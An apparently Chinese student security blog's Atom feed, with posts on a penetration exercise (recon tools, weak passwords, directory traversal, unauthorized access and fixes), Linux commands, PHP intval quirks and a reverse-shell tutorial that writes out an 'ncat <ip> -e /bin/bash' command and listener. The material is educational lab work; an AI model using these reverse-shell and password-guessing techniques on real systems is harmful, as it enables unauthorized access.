<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>睡个好觉......</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://luffys93.github.io/"/>
  <updated>2024-08-13T07:38:28.225Z</updated>
  <id>http://luffys93.github.io/</id>
  
  <author>
    <name>Ins0mn1a</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>渗透总结</title>
    <link href="http://luffys93.github.io/2024/08/05/shentou/shentou/"/>
    <id>http://luffys93.github.io/2024/08/05/shentou/shentou/</id>
    <published>2024-08-05T05:06:27.000Z</published>
    <updated>2024-08-13T07:38:28.225Z</updated>
    
    <content type="html"><![CDATA[<p>前一段时间我和我同学参加了某个地区的真实渗透演练，由于是第一次参加这种活动，所以总的来说收获特别大，直接给在网安道路上迷路的我打了一棒槌。这么难忘且珍贵的经历不好好总结一下怎么行？</p><p>这次演练教会了我很多东西，除了前期对目标资产进行常规的信息搜集之外，我还学习使用了在CTF中从来都没有用到过的工具。（只能说我们经常打的CTF与现实生活还是有一定区别的）。当成功进入某个信息管理平台的后台管理系统或者说拿到某个服务器的shell时，咱们几个的表情已经没法用快乐来形容了，我想这也是学习网安的乐趣所在啊。</p><span id="more"></span><p>这里并不会对提到的工具进行详细地解说，后续我会针对这些工具进行更深一步地功能探索与应用</p><h1 id="1-工具"><a href="#1-工具" class="headerlink" title="1 工具"></a>1 工具</h1><h2 id="1-1-抓包"><a href="#1-1-抓包" class="headerlink" title="1.1 抓包"></a>1.1 抓包</h2><p>这里就不用大费周章地去讲burpsuite了，反正CTF用的已经够多了。这里就介绍我在这次演练中之前从没使用过的。</p><h3 id="1-1-1-fiddler"><a href="#1-1-1-fiddler" class="headerlink" title="1.1.1 fiddler"></a>1.1.1 fiddler</h3><p><img src="./shentou/image-20240805142037542.png" alt="image-20240805142037542"></p><p>fiddler相较于burpsuite有几个特点：</p><ol><li>图中可以看出，fiddler能够获取某一段时间的所有流量并将它们显示出来，无论是运行中的软件还是其他已开放的端口；（应该是某些配置的问题导致没法对某一个端口进行专门的抓包，要看某端口的流量还得靠过滤，我后面看看）</li><li>fiddler在进行流量抓取时可选择拦截或不拦截（对我来说这个功能让它比burpsuite方便了一些）</li><li>对于其他方式如POST进行请求的包，fiddler可以用树状形式将请求或相应的数据显示出来（JSON功能那可以看看）</li><li>……</li></ol><p>这几个特点在演习中有明显的体现，例如在对某站点的登录功能进行分析时，可以随便输入用户名密码，登录后查看fiddler，会发现抓取到其他接口的包，而它的JSON则包含的有其他数据，我们可以利用这些数据对身份进行伪造等行为，绕过限制来进入其后台系统</p><h3 id="1-1-2-proxifier"><a href="#1-1-2-proxifier" class="headerlink" title="1.1.2 proxifier"></a>1.1.2 proxifier</h3><p>对我来说，从某种意义上来讲它是一个辅助工具。对微信小程序抓包还是有点帮助的。</p><h2 id="1-2-信息收集"><a href="#1-2-信息收集" class="headerlink" title="1.2 信息收集"></a>1.2 信息收集</h2><h3 id="1-2-1-fofa"><a href="#1-2-1-fofa" class="headerlink" title="1.2.1 fofa"></a>1.2.1 fofa</h3><p>它是白帽汇推出的一款网络空间资产搜索引擎，在查询某个ip时会显示它自己以及其他端口的响应包。</p><p>工具网址：<a href="https://fofa.info/">https://fofa.info/</a></p><p><img src="./shentou/image-20240805152422916.png" alt="image-20240805152422916"></p><h3 id="1-2-2-Censys"><a href="#1-2-2-Censys" class="headerlink" title="1.2.2 Censys"></a>1.2.2 Censys</h3><p>Censys跟fofa的功能大致一样，不过根据前段时间的使用情况来看，Censys检索的结果比fofa稍微详细一些。</p><p>工具网址：<a href="https://search.censys.io/">https://search.censys.io/</a></p><p><img src="./shentou/image-20240805152730216.png" alt="image-20240805152730216"></p><h3 id="1-2-3-hunter"><a href="#1-2-3-hunter" class="headerlink" title="1.2.3 hunter"></a>1.2.3 hunter</h3><p>hunter，即奇安信的鹰图平台，功能跟前面提到的差不多</p><p>工具网址：<a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p><p><img src="./shentou/image-20240805153145339.png" alt="image-20240805153145339"></p><h3 id="1-2-4-ICP-IP地址-域名信息备案管理系统"><a href="#1-2-4-ICP-IP地址-域名信息备案管理系统" class="headerlink" title="1.2.4 ICP/IP地址/域名信息备案管理系统"></a>1.2.4 ICP/IP地址/域名信息备案管理系统</h3><p>工信部做的这个系统主要用于ICP备案查询，得到某资产的域名。</p><p>工具网址：<a href="https://beian.miit.gov.cn/#/Integrated/index">https://beian.miit.gov.cn/#/Integrated/index</a></p><p><img src="./shentou/image-20240805153412843.png" alt="image-20240805153412843"></p><h3 id="1-2-5-企查查-爱企查"><a href="#1-2-5-企查查-爱企查" class="headerlink" title="1.2.5 企查查/爱企查"></a>1.2.5 企查查/爱企查</h3><p>像企查查等这些工具网上比比皆是，目前我还没用到精髓，只是用来查查官网站点和法定责任人的相关资产。</p><h2 id="1-3-探测"><a href="#1-3-探测" class="headerlink" title="1.3 探测"></a>1.3 探测</h2><p>我所总结的探测主要是：找到内网的其他服务器，某服务器的端口存活情况，站点漏洞的指纹识别等等，我就一起说了吧</p><h3 id="1-3-1-nmap"><a href="#1-3-1-nmap" class="headerlink" title="1.3.1 nmap"></a>1.3.1 nmap</h3><p>这个不多说，具体怎么用就搜搜网上其他的博客吧</p><h3 id="1-3-2-fscan"><a href="#1-3-2-fscan" class="headerlink" title="1.3.2 fscan"></a>1.3.2 fscan</h3><p>fscan除了能够探测IP以及端口外，还能够检测目标ip的漏洞</p><h3 id="1-3-3-nuclei"><a href="#1-3-3-nuclei" class="headerlink" title="1.3.3 nuclei"></a>1.3.3 nuclei</h3><p>nuclei是kali自带的一个基于指纹识别的漏洞扫描器，不过得配合<a href="https://github.com/projectdiscovery/nuclei-templates">nuclei-templates</a>使用，里面有很多漏洞指纹，已经够扫的了。</p><h3 id="1-3-4-To-Be-Added（有点小忘了）"><a href="#1-3-4-To-Be-Added（有点小忘了）" class="headerlink" title="1.3.4 To Be Added（有点小忘了）"></a>1.3.4 To Be Added（有点小忘了）</h3><h1 id="2-漏洞"><a href="#2-漏洞" class="headerlink" title="2 漏洞"></a>2 漏洞</h1><p>目前的许多平台漏洞如出一辙，主要有这些：弱口令，目录穿越，未授权访问</p><h2 id="2-1-弱口令"><a href="#2-1-弱口令" class="headerlink" title="2.1 弱口令"></a>2.1 弱口令</h2><p>弱口令是我目前见到最多的漏洞。弱口令可不仅限于admin:admin这类的，攻击者还可以通过资产名，管理员名等信息对用户名密码进行联想。假设某平台缩写是ssss，那么它相应的后台管理系统的管理员名称就可能是ssss，密码则是ssss加上符号、数字这几种，例如ssss@1234。</p><p>解决这种漏洞也很简单，增加密码最小长度，密码里的字符类型至少有两三种，避免使用生日、姓名等敏感信息设置密码，对单个设备的登录次数进行限制等</p><h2 id="2-2-目录穿越"><a href="#2-2-目录穿越" class="headerlink" title="2.2 目录穿越"></a>2.2 目录穿越</h2><p>一般情况下，你光靠在url的资源路径上加<code>../</code>是没法利用目录穿越的，因为大部分目录并没有<code>index.html</code>文件，用户访问会直接出现403，所以更多的是在查询参数中利用目录穿越。</p><p>目录穿越的成因一般是开发者或者运维人员没有对用户的输入进行严格地检查与过滤，而输入的数据我猜是交给类似于文件包含的函数去处理了，同时查询的文件权限没有分配好，因此会让攻击者肆虐地读取系统上的任意文件。</p><p>解决方法就是做好检测与过滤，分配好每一个敏感文件的读写权限</p><h2 id="2-3-未授权访问"><a href="#2-3-未授权访问" class="headerlink" title="2.3 未授权访问"></a>2.3 未授权访问</h2><p>未授权访问漏洞也是我这次演练见到的比较多的一个漏洞了。举个例子，一个房间中有一扇不能上锁但是能用钥匙或门把手打开的小门，正常情况下房间的拥有者不希望没有钥匙的人进入房间，但是由于小门不能上锁，因此其他人可以通过门把手开门进入房间。</p><p>回到现实中来，一个后台管理系统的路径是<code>https://url/cms/index</code>，正常情况下是需要登录才能进入，即没有登陆过的设备直接访问该路径时会跳转到<code>https://url/cms/login.html</code>，但是运维人员没有对用户的身份进行严格地检验，导致普通用户也能访问后台系统。</p><p>解决漏洞的方法就是对请求访问的设备进行严格的身份检验，管理好用户的权限</p><p>先写这么多，后续还会更新的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前一段时间我和我同学参加了某个地区的真实渗透演练，由于是第一次参加这种活动，所以总的来说收获特别大，直接给在网安道路上迷路的我打了一棒槌。这么难忘且珍贵的经历不好好总结一下怎么行？&lt;/p&gt;
&lt;p&gt;这次演练教会了我很多东西，除了前期对目标资产进行常规的信息搜集之外，我还学习使用了在CTF中从来都没有用到过的工具。（只能说我们经常打的CTF与现实生活还是有一定区别的）。当成功进入某个信息管理平台的后台管理系统或者说拿到某个服务器的shell时，咱们几个的表情已经没法用快乐来形容了，我想这也是学习网安的乐趣所在啊。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://luffys93.github.io/2024/07/29/hello-world/"/>
    <id>http://luffys93.github.io/2024/07/29/hello-world/</id>
    <published>2024-07-29T05:34:18.859Z</published>
    <updated>2024-07-31T08:39:24.861Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><span id="more"></span><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;Quick-Start&quot;&gt;&lt;a href=&quot;#Quick-Start&quot; class=&quot;headerlink&quot; title=&quot;Quick Start&quot;&gt;&lt;/a&gt;Quick Start&lt;/h2&gt;&lt;h3 id=&quot;Create-a-new-post&quot;&gt;&lt;a href=&quot;#Create-a-new-post&quot; class=&quot;headerlink&quot; title=&quot;Create a new post&quot;&gt;&lt;/a&gt;Create a new post&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ hexo new &lt;span class=&quot;string&quot;&gt;&amp;quot;My New Post&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;More info: &lt;a href=&quot;https://hexo.io/docs/writing.html&quot;&gt;Writing&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;Run-server&quot;&gt;&lt;a href=&quot;#Run-server&quot; class=&quot;headerlink&quot; title=&quot;Run server&quot;&gt;&lt;/a&gt;Run server&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ hexo server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>学习web安全的那些二三事-反弹Shell篇</title>
    <link href="http://luffys93.github.io/2024/07/03/Webbbb/Others/Shell/"/>
    <id>http://luffys93.github.io/2024/07/03/Webbbb/Others/Shell/</id>
    <published>2024-07-03T07:58:06.000Z</published>
    <updated>2024-07-31T08:39:06.251Z</updated>
    
    <content type="html"><![CDATA[<p>反弹Shell也是一个需要掌握的技巧<del>（实际上我也没掌握到多少，还搞得好混乱，只有找题来看看）</del></p><p>在有反弹shell之前，技术人员连接目标机器采用的是老早的传统连接方法，例如有Telnet、ssh、远程桌面协议等等，还有其他的第三方远程管理工具如VNC与一些批处理脚本。这些连接方式可以称为主动连接。</p><p>不过，有的目标机器会有一些限制：</p><ol><li>目标机器对连接进行了限制，即允许出站连接，但限制了很多入站连接，这作用与内网无异；</li><li>目标机器的某端口被占用，由于其本身的防火墙策略会导致ssh连接被阻断；</li><li>目标机器的ip是动态的，或者处于内网状态下（即目标机器处于局域网之中，ip地址由NAT管理）；</li></ol><p>反弹shell就是为了绕过上述条件而产生的，原理就是让目标机器主动连接外部设备。</p><p>反弹shell的方法有很多种，包括但不限于python脚本反弹，netcat反弹，bash反弹等等。</p><span id="more"></span><p>:::info</p><p>以下图示都是以kali作为攻击机来反弹shell，目标机器是ubuntu或者windows，图示会有说明</p><p>:::</p><h1 id="netcat反弹shell"><a href="#netcat反弹shell" class="headerlink" title="netcat反弹shell"></a>netcat反弹shell</h1><p>这个就比较简单粗暴了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ncat &lt;ip&gt;&lt;port&gt; -e /bin/bash</span><br><span class="line"><span class="comment"># nc是netcat的缩写，它们跟ncat的不同之处是：</span></span><br><span class="line"><span class="comment"># netcat比较传统，ncat比较现代化，说白了，ncat能做netcat所有能做的事</span></span><br><span class="line"><span class="comment"># 标注一下：ncat实际上是nmap的一部分，由nmap团队维护</span></span><br><span class="line"><span class="comment"># 不过不同发行版的nc似乎不同呢，ubuntu和kali就不太一样</span></span><br><span class="line"><span class="comment"># 比如这个-e，意思是在连接到目标端口后执行某一条命令，不过ubuntu没有这个选项</span></span><br><span class="line"><span class="comment"># 所以最好用ncat</span></span><br></pre></td></tr></table></figure><img src="/2024/07/03/Webbbb/Others/Shell/e1b66b54cf1ded7c41fb50d89f485011.png" class="" title="e1b66b54cf1ded7c41fb50d89f485011"><p>左侧是kali，右侧是ubuntu</p><p>（正常情况来说是会显示用户名+主机名的，但是这里不知道为什么显示不出来）</p><p>windows应该是自带有bash的，也可以利用其来反弹shell</p><img src="/2024/07/03/Webbbb/Others/Shell/image-20240703181705813.png" class="" title="image-20240703181705813"><p>左侧为kali，右侧为windows powershell</p><p>这里说一下攻击机的bash命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp &lt;port&gt;\</span><br><span class="line"><span class="comment"># -l：监听模式，即nc会监听指定的端口，等待连接；</span></span><br><span class="line"><span class="comment"># -v：详细模式，用于打印更多信息；</span></span><br><span class="line"><span class="comment"># -p：端口号，即输入的监听端口号；</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;反弹Shell也是一个需要掌握的技巧&lt;del&gt;（实际上我也没掌握到多少，还搞得好混乱，只有找题来看看）&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;在有反弹shell之前，技术人员连接目标机器采用的是老早的传统连接方法，例如有Telnet、ssh、远程桌面协议等等，还有其他的第三方远程管理工具如VNC与一些批处理脚本。这些连接方式可以称为主动连接。&lt;/p&gt;
&lt;p&gt;不过，有的目标机器会有一些限制：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;目标机器对连接进行了限制，即允许出站连接，但限制了很多入站连接，这作用与内网无异；&lt;/li&gt;
&lt;li&gt;目标机器的某端口被占用，由于其本身的防火墙策略会导致ssh连接被阻断；&lt;/li&gt;
&lt;li&gt;目标机器的ip是动态的，或者处于内网状态下（即目标机器处于局域网之中，ip地址由NAT管理）；&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;反弹shell就是为了绕过上述条件而产生的，原理就是让目标机器主动连接外部设备。&lt;/p&gt;
&lt;p&gt;反弹shell的方法有很多种，包括但不限于python脚本反弹，netcat反弹，bash反弹等等。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>linux-second</title>
    <link href="http://luffys93.github.io/2024/06/27/Webbbb/linux/linux-second/"/>
    <id>http://luffys93.github.io/2024/06/27/Webbbb/linux/linux-second/</id>
    <published>2024-06-27T05:54:49.000Z</published>
    <updated>2024-07-31T08:38:59.073Z</updated>
    
    <content type="html"><![CDATA[<p>这里开始针对命令的一些骚操作了（顺序按字典排序）</p><h1 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h1><p>上次提到过，curl是用于在请求一个web服务器，也可以用于下载服务器上的文件，可以是一个网址，也可以是一个ip</p><p>一般情况下是这样的：</p><img src="/2024/06/27/Webbbb/linux/linux-second/image-20240627135942710.png" class="" title="image-20240627135942710"><span id="more"></span><p>但是在输入ip时，你也可以将<code>.</code>换成<code>。</code>，对下列操作没有任何影响</p><img src="/2024/06/27/Webbbb/linux/linux-second/image-20240627140044395.png" class="" title="image-20240627140044395"><p>这里猜测是url在检查的时候把<code>。</code>自动切换了为<code>.</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这里开始针对命令的一些骚操作了（顺序按字典排序）&lt;/p&gt;
&lt;h1 id=&quot;curl&quot;&gt;&lt;a href=&quot;#curl&quot; class=&quot;headerlink&quot; title=&quot;curl&quot;&gt;&lt;/a&gt;curl&lt;/h1&gt;&lt;p&gt;上次提到过，curl是用于在请求一个web服务器，也可以用于下载服务器上的文件，可以是一个网址，也可以是一个ip&lt;/p&gt;
&lt;p&gt;一般情况下是这样的：&lt;/p&gt;
&lt;img src=&quot;/2024/06/27/Webbbb/linux/linux-second/image-20240627135942710.png&quot; class=&quot;&quot; title=&quot;image-20240627135942710&quot;&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>学习web安全的那些二三事-linux篇（1）</title>
    <link href="http://luffys93.github.io/2024/06/25/Webbbb/linux/linux-first/"/>
    <id>http://luffys93.github.io/2024/06/25/Webbbb/linux/linux-first/</id>
    <published>2024-06-25T08:20:52.000Z</published>
    <updated>2024-07-31T08:38:54.624Z</updated>
    
    <content type="html"><![CDATA[<p>这一部分主要讲的是linux。</p><p>为什么要讲linux呢？<del>因为要用，其重要性不言而喻</del>。</p><p>（这些命令基于我在做运维和CTF题时总结的，有的因为年代久远忘记了，目前正在恢复中，遇到什么补上什么）</p><h1 id="linux中常用的几个命令"><a href="#linux中常用的几个命令" class="headerlink" title="linux中常用的几个命令"></a>linux中常用的几个命令</h1><p>按功能分类来说比较好一点，这样就可以知道在某些命令被过滤的情况下有哪些命令可以替代使用</p><h2 id="文件目录和操作"><a href="#文件目录和操作" class="headerlink" title="文件目录和操作"></a>文件目录和操作</h2><ol><li><p>ls：展示某个目录下的所有子目录以及文件（隐藏文件默认不展示），如果后面没有跟路径名，则默认展示当前目录；</p></li><li><p>cd：进入某个目录下，后面需要跟路径名</p></li><li><p>pwd：输出当前目录的绝对路径</p></li><li><p>mkdir/rmdir：创建一个目录</p></li><li><p>cp：将某个文件或目录复制到另外一个文件或目录</p></li><li><p>mv：移动或重命名某个文件或目录</p></li><li><p>find：查找文件或目录，输出其地址</p></li><li><p>tree：显示目录的分支结构</p></li><li><p>TO BE ADDED</p><span id="more"></span><p>这里主要说一下ls的常用选项：</p></li><li><p>-a 显示目录下所有的文件（包括隐藏文件）</p></li><li><p>-l 将列出的文件以长格式输出</p></li><li><p>-R 列出目录下的所有子目录和文件，若子目录中还有文件或子目录，则重复当前操作</p></li></ol><p>:::info</p><p>在大多数linux系统中，ls加部分选项是可以简写的，如ls -l可以简写成ll；</p><p>:::</p><h2 id="文件内容和查看"><a href="#文件内容和查看" class="headerlink" title="文件内容和查看"></a>文件内容和查看</h2><ol><li>cat/tac：前者按行号正序输出文件内容，后者按行号倒序输出文件内容；</li><li>more/less：分页显示文件内容</li><li>head/tail：默认情况下前者显示文件的前十行，后者显示文件的后十行</li><li>nl：显示文件内容并标明行号</li><li>touch：创建文件</li><li>rm：和rmdir差不多，不过这里针对的是文件</li><li>vi/vim：编辑文件</li><li>TO BE ADDED</li></ol><p>:::warning no-icon</p><p>这里的三个命令被称为linux文本处理三剑客，具体用法可以上网搜搜，这里只给出简单的例子</p><ol><li>grep：</li></ol><img src="/2024/06/25/Webbbb/linux/linux-first/image-20240626133809229.png" class="" title="image-20240626133809229"><ol start="2"><li>awk：</li></ol><img src="/2024/06/25/Webbbb/linux/linux-first/image-20240626140352836.png" class="" title="image-20240626140352836"><ol start="3"><li>sed：</li></ol><img src="/2024/06/25/Webbbb/linux/linux-first/image-20240626141229565.png" class="" title="image-20240626141229565"><p>实际上，”三剑客“对于查找数据有着重要作用，如果能通过它们将其他命令灵活结合起来，那么我们就可以快速地从一堆冗余的文字中提取我们想要的数据，从而节省了许多时间。</p><p><del>我还不怎么会用，特别是条件的编写</del></p><p>当然了，它们也能对文本进行增、删、改，具体的呢就上网查查叭</p><p>:::</p><h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><ol><li>chmod：更改文件和目录的权限</li><li>chown：更改文件和目录的拥有者</li><li>passwd：更改某用户的密码</li><li>sudo：以管理员身份执行某条命令</li><li>TO BE ADDED</li></ol><h2 id="压缩与打包"><a href="#压缩与打包" class="headerlink" title="压缩与打包"></a>压缩与打包</h2><ol><li><p>tar：打包某个文件或目录（有的博客会说它有压缩和解压功能，实际上它本身并不具有这些功能，只能通过调用其他其他的功能来完成这一过程）</p></li><li><p>gzip：将打包后的文件或目录进行压缩（一般后缀是tar.gz，因为它一般都是压缩tar文件）</p></li><li><p>zip/unzip：压缩或解压缩zip文件</p></li><li><p>TO BE ADDED</p></li></ol><h2 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h2><ol><li>wget/curl：从某个网站中获取文件或其他信息</li><li>netstat：显示网络连接信息</li><li>nc：连接目标主机的终端</li><li>ping：检测本地与目标的网络是否通畅</li><li>ssh：本地远程登录目标主机</li><li>TO BE ADDED</li></ol><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><ol><li>ps：查看进程信息，ps aux则是查看所有进程的信息</li><li>kill：停止进程的运行</li><li>TO BE ADDED</li></ol><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ol><li>whoami：查询自己是哪一位用户</li><li>echo：显示指定的文字，一般与重定向使用</li><li>TO BE ADDED</li></ol><h1 id="额外哆嗦的一些命令"><a href="#额外哆嗦的一些命令" class="headerlink" title="额外哆嗦的一些命令"></a>额外哆嗦的一些命令</h1><h2 id="文件内容和查看-1"><a href="#文件内容和查看-1" class="headerlink" title="文件内容和查看"></a>文件内容和查看</h2><ol><li>sort：给文件的每一行进行排序，默认是字典排序</li><li>uniq：将文件内容进行去重后输出</li><li>od：把文件转换成某种形式输出，包括字符，ascii，二进制，八进制，十六进制</li></ol><p>:::warning</p><p>上面几个命令不会直接对文件内容作任何更改的，只是输出的内容可能跟文件内容不一样</p><p>:::</p><ol start="4"><li>strings：查找文件中指定内容并输出，默认情况下是查找长度至少为4的字符串</li><li>cut：按照输入的条件选取文本内容进行输出</li><li>paste：将指定的文件以列为单位进行合并并输出</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这一部分主要讲的是linux。&lt;/p&gt;
&lt;p&gt;为什么要讲linux呢？&lt;del&gt;因为要用，其重要性不言而喻&lt;/del&gt;。&lt;/p&gt;
&lt;p&gt;（这些命令基于我在做运维和CTF题时总结的，有的因为年代久远忘记了，目前正在恢复中，遇到什么补上什么）&lt;/p&gt;
&lt;h1 id=&quot;linux中常用的几个命令&quot;&gt;&lt;a href=&quot;#linux中常用的几个命令&quot; class=&quot;headerlink&quot; title=&quot;linux中常用的几个命令&quot;&gt;&lt;/a&gt;linux中常用的几个命令&lt;/h1&gt;&lt;p&gt;按功能分类来说比较好一点，这样就可以知道在某些命令被过滤的情况下有哪些命令可以替代使用&lt;/p&gt;
&lt;h2 id=&quot;文件目录和操作&quot;&gt;&lt;a href=&quot;#文件目录和操作&quot; class=&quot;headerlink&quot; title=&quot;文件目录和操作&quot;&gt;&lt;/a&gt;文件目录和操作&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;ls：展示某个目录下的所有子目录以及文件（隐藏文件默认不展示），如果后面没有跟路径名，则默认展示当前目录；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;cd：进入某个目录下，后面需要跟路径名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;pwd：输出当前目录的绝对路径&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;mkdir/rmdir：创建一个目录&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;cp：将某个文件或目录复制到另外一个文件或目录&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;mv：移动或重命名某个文件或目录&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;find：查找文件或目录，输出其地址&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;tree：显示目录的分支结构&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;TO BE ADDED&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>学习web安全的那些二三事-php篇（1）</title>
    <link href="http://luffys93.github.io/2024/06/25/Webbbb/PHP/php-first/"/>
    <id>http://luffys93.github.io/2024/06/25/Webbbb/PHP/php-first/</id>
    <published>2024-06-25T00:01:30.000Z</published>
    <updated>2024-07-31T08:39:13.467Z</updated>
    
    <content type="html"><![CDATA[<p>从大一入学学习安全到现在，我已经见识到许多基本漏洞以及这些漏洞的变形，这里就写几篇博客总结一下这段时间的学习，顺便也记录一下一些漏洞，以便查看</p><p>这里从一些常见的php的语言特性和函数开始说起</p><h1 id="1-intval"><a href="#1-intval" class="headerlink" title="1.intval"></a>1.intval</h1><p>细说一下intval的具体用法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>)</span><br></pre></td></tr></table></figure><p><code>intval</code>用于获取变量的整数值，$value为任意类型的变量，后面为进制数，意思是经过转化后输出该进制的数，如果没有数或者输入的数为0，则默认为十进制</p><p>这里罗列了以下几种输入（注释内容为intval转化后的内容）：</p><span id="more"></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>; <span class="comment">// 1</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">1.1</span>; <span class="comment">// 1</span></span><br><span class="line"><span class="variable">$c</span> = <span class="string">&#x27;1c&#x27;</span>;<span class="comment">// 1</span></span><br><span class="line"><span class="variable">$d</span> = <span class="string">&#x27;c1&#x27;</span>;<span class="comment">// 0 </span></span><br><span class="line"><span class="variable">$j</span> = <span class="string">&#x27;2543sqd&#x27;</span>;<span class="comment">// 2543</span></span><br><span class="line"><span class="variable">$e</span> = <span class="number">2e10</span>;<span class="comment">// 20000000000</span></span><br><span class="line"><span class="variable">$f</span> = <span class="string">&#x27;2e10&#x27;</span>; <span class="comment">// 